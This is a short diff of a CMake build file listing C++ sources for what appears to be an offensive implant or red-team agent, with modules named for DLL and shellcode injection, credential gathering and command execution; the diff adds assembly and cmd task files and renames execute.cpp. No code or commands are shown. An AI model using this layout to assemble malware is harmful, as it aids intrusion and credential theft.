@@ -76,15 +76,17 @@ set(SOURCE_CORE
         src/core/system/user.cpp
         src/core/technique/injection/dll_injection.cpp
         src/core/technique/injection/shellcode_injection.cpp
+        src/core/task/assembly.cpp
         src/core/task/cat.cpp
         src/core/task/cd.cpp
+        src/core/task/cmd.cpp
         src/core/task/connect.cpp
         src/core/task/cp.cpp
         src/core/task/creds.cpp
         src/core/task/dll.cpp
         src/core/task/download.cpp
         src/core/task/env.cpp
-        src/core/task/execute.cpp
+        src/core/task/exe.cpp
         src/core/task/group.cpp
         src/core/task/history.cpp
         src/core/task/ip.cpp
